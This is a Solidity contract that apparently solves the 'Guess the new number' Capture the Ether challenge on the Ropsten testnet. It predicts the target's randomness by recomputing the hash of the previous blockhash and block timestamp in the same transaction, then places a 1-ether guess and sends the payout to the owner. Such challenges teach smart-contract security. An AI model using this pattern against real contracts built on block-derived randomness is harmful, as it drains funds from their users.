// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberSolver {
    IGuessTheNewNumberChallenge public challenge;
    address public owner;

    constructor(address _challengeAddress) {
        challenge = IGuessTheNewNumberChallenge(_challengeAddress);
        owner = msg.sender;
    }

    function solve() public payable {
        require(msg.sender == owner, "Only the boss can solve the challenge");
        require(msg.value == 1 ether, "You must pay 1 ether to solve this challenge");
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        challenge.guess{value: 1 ether}(answer);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

//https://ropsten.etherscan.io/address/0x4dde3302a55b010e777855be10134c48d2653604